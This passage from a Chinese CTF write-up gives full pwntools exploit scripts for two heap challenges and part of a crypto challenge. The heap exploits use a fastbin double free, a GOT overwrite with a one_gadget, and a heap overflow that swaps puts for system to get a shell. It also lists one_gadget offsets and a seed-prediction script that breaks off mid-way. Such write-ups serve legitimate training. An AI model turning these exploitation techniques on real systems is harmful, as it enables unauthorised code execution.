3.之后把double free的fastbin分配给add_note函数，创建一个note，劫持fastbin的fd，设置为可控位置note
array，note array上事先要有一个大小为0x21的note  
4.把可控位置的fastbin分配给add_note函数，创建note，这样就可以修改note array上的指针了，利用update、view任意地址读写  
5.操作是rand的，但可以预测，需要凑出一个合适的操作序列
    from pwn import *
    import ctypes
    libc = ctypes.CDLL("./libc-2.23.so")
    libc.srand(None)
    actions = []
    for i in range(0x30):
        x = libc.rand()
        if x%4 == 0:
            actions.append("add")
            print i
        elif x%4 == 1:
            actions.append("update")
        elif x%4 == 2:
            actions.append("delete")
        else:
            actions.append("view")
    print actions
    def choice_pass():
        x = p.recvuntil("(Y/N)\n")
        p.sendline("N")
    def add_note(size, content, x):
        p.recvuntil("Do you want to add note?(Y/N)\n")
        p.sendline("Y")
        p.recvuntil("Input the size of the note:\n")
        p.sendline(str(size))
        p.recvuntil("Input the content of the note:\n")
        p.send(content)
        p.recvuntil("Do you want to add another note, tomorrow?(Y/N)\n")
        p.sendline(x)
    def view(idx):
        p.recvuntil("Do you want to view note?(Y/N)\n")
        p.sendline("Y")
        p.recvuntil("Input the index of the note:\n")
        p.sendline(str(idx))
        return u64(p.recv(6).ljust(8,"\x00"))
    def update(idx, content):
        p.recvuntil("Do you want to update note?(Y/N)\n")
        p.sendline("Y")
        p.recvuntil("Input the index of the note:")
        p.sendline(str(idx))
        p.recvuntil("Input the new content of the note:\n")
        p.send(content)
    elf = ELF("./libc-2.23.so")
    #p = process("./random")
    p = remote("49.4.15.125",31697)
    p.recvuntil("Please input your name:\n")
    p.send("1"*8)
    p.recvuntil("1"*8)
    addr = u64(p.recv(6).ljust(8,"\x00"))
    elf_base = addr - 0xb90
    print hex(elf_base)
    print hex(elf_base + 0x203168)
    print hex(elf_base + 0x11ac)
    print hex(elf_base + 0x203190)
    p.sendline("10")
    p.recvuntil("How many times do you want to play this game today?(0~10)\n")#1
    p.sendline("8")
    add_note(0x21, "A1Lin\n", "Y")
    for i in range(7):
        choice_pass()
    p.recvuntil("How many times do you want to play this game today?(0~10)\n")#2
    p.sendline("7") #double free
    for i in range(9):
        choice_pass()   
    p.recvuntil("How many times do you want to play this game today?(0~10)\n")#3
    p.sendline("2") #hijck fastbin
    add_note(17, p64(elf_base+0x203180) + "\n", "N")
    choice_pass()
    p.recvuntil("How many times do you want to play this game today?(0~10)\n")#4
    p.sendline("6")
    choice_pass()
    add_note(0x21, "A1Lin\n", "N")
    choice_pass()
    add_note(0x21, "A1Lin\n", "N")
    for i in range(2):
        choice_pass()
    p.recvuntil("How many times do you want to play this game today?(0~10)\n")#5
    p.sendline("5")
    for i in range(5):
        choice_pass()
    p.recvuntil("How many times do you want to play this game today?(0~10)\n")#6
    p.sendline("10")
    add_note(17, p64(elf_base + 0x2031a0) + p64(0x20)[0:6] + "\n", "N")
    update(1, p64(elf_base + 0x0203018) + "\n")
    addr = view(2)
    print "free: " + hex(addr)
    elf.address = addr - elf.symbols["free"]
    print "libc: " + hex(elf.address)
    print hex(elf_base + 0x203018)
    update(1, p64(elf_base + 0x203018) +  p64(0x20)[0:6] + "\n")#free_got
    choice_pass()
    choice_pass()
    choice_pass()
    update(2, p64(elf.address + 0xf1147) + "\n")
    #print p.recv()
    #gdb.attach(p)
    p.interactive()
    '''
    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    0xcd0f3 execve("/bin/sh", rcx, r12)
    constraints:
      [rcx] == NULL || rcx == NULL
      [r12] == NULL || r12 == NULL
    0xcd1c8 execve("/bin/sh", rax, r12)
    constraints:
      [rax] == NULL || rax == NULL
      [r12] == NULL || r12 == NULL
    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
    constraints:
      [rcx] == NULL || rcx == NULL
      [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
    '''
### 强网先锋-AP
堆溢出直接泄露puts地址，然后堆溢出覆盖puts为system拿shell
    from pwn import *
    def get(length, name):
        p.recvuntil("Choice >> \n")
        p.sendline("1")
        p.recvuntil("The length of my owner's name:\n")
        p.sendline(str(length))
        p.recvuntil("Give me my owner's name:\n")
        p.send(name)
    def open(idx):
        p.recvuntil("Choice >> \n")
        p.sendline("2")
        p.recvuntil("Please tell me which tickets would you want to open?\n")
        p.sendline(str(idx))
        p.recvuntil("I'm a magic tickets.I will tell you who is my owner!\n")
    def change(idx, length, name):
        p.recvuntil("Choice >> \n")
        p.sendline("3")
        p.recvuntil("Please tell me which tickets would you want to change it's owner's name?\n")
        p.sendline(str(idx))
        p.recvuntil("The length of my owner's name:")
        p.sendline(str(length))
        p.recvuntil("Give me my owner's name:\n")
        p.send(name)
    #p = process("./task_main")
    libc = ELF("./libc-2.23.so")
    p = remote("117.78.39.172",32146)
    get(0x10,"A1Lin1")
    get(0x10,"A1Lin2")
    change(0,0x21, "a"*0x20)
    open(0)
    p.recvuntil("a"*0x20)
    heap_addr = u64(p.recv(6).ljust(8,"\x00"))
    print hex(heap_addr)
    change(0,0x29, "a"*0x28)
    open(0)
    p.recvuntil("a"*0x28)
    puts_addr = u64(p.recv(6).ljust(8,"\x00"))
    libc.address = puts_addr - libc.symbols["puts"]
    change(0,0x29+8, "a"*0x10 + p64(0) + p64(0x21) + p64(heap_addr) + p64(libc.symbols["system"]))
    change(1,9,"/bin/sh\x00")
    open(1)
    print hex(libc.address)
    #gdb.attach(p)
    p.interactive()
## Crypto
### randomstudy
  * step1 暴力猜测系统时间种子
  * step2 java 伪随机数预测
  * step3 题目漏洞，直接利用step1中的种子预测随机数。  
脚本如下：
        import random
    import time
    from pwn import *
    import gmpy2
    from Crypto.Util.number import long_to_bytes
    context.log_level = "debug"
    import hashlib
    def proof(prefix,hexdig):
      for a in range(0,256):
          for b in range(0,256):
              for c in range(0,256):
                  skr = prefix + chr(a) +chr(b) + chr(c)
                  if hashlib.sha256(skr).hexdigest()==hexdig:
                      return skr.encode("hex")
    ip = '119.3.245.36'
    port = 23456
    token = "08c5028f14a51d3336c3e4f80414706d"
    io = remote(ip,port)
    io.recvline()
    hexdig = io.recvline().split("=")[1].strip()
    prefix = io.recvline().split("=")[1].strip().decode("hex")
    io.sendlineafter("skr.encode('hex')=",proof(prefix,hexdig))
    io.sendlineafter("[+]teamtoken:",token)
    io.recvuntil("[-]")
    seed_tem = int(time.time())
    print seed_tem
    random.seed(seed_tem)
    io.sendline(str(random.randint(0,2**64)))
    second = 1
    while "fail" in io.recvline():
      temp = seed_tem+second
      random.seed(temp)
      for i in range(second):
          random.randint(0,2**64)
      io.sendlineafter("[-]",str(random.randint(0,2**64)))
      second = second+1
    io.recvuntil("[+]Generating challenge 2\n")
    v1 = int(io.recvline().split("[-]")[1].strip())
    v2 = int(io.recvline().split("[-]")[1].strip())
    def replicateState(nextN,nextM):
      temN = nextN
      temM = nextM
      seed = []
      multiplier = 0x5DEECE66D
      addend = 0xB
      mask = (1L >16
          if len(bin(pre))-2==32 and bin(pre)[2]=='1':
              return pre-1
          return pre
      nextN = -(0xffffffff-nextN)
      oldSeedUpperN = (nextN << (48 - 32)) & mask
      newSeedUpperM = (nextM << (48 - 32)) & mask
      oldSeed = oldSeedUpperN
      for i in range(oldSeed,(oldSeedUpperN | ((1L << (48 - 32)) - 1))+1):
          newSeed = (i * multiplier + addend) & mask
          if ((newSeed & upperMOf48Mask) == newSeedUpperM):